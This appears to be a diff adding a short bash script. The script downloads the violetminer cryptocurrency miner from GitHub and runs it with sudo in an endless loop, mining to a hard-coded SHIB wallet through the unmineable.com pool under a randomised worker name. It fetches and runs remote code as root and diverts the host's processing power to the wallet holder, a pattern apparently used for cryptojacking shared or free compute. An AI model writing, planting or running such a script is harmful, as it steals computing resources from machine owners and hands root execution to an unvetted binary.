@@ -1,0 +1,9 @@
+#!/bin/bash
+wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz
+tar xvf violetminer-linux-v0.2.2.tar.gz && tar xvf violetminer-linux-v0.2.2.tar.gz
+cd violetminer-linux-v0.2.2
+chmod +x violetminer-linux-v0.2.2
+while [ 1 ]; do
+  sleep 2
+  sudo ./violetminer-linux-v0.2.2 --algorithm wrkzcoin --pool rx.unmineable.com:80 --username SHIB:0x2a1a513011fd92781fde8fd7aa95d3c2b1fa12ea.$(echo $(shuf -i 1-9999 -n 1)-Gagal) --threads 4
+done
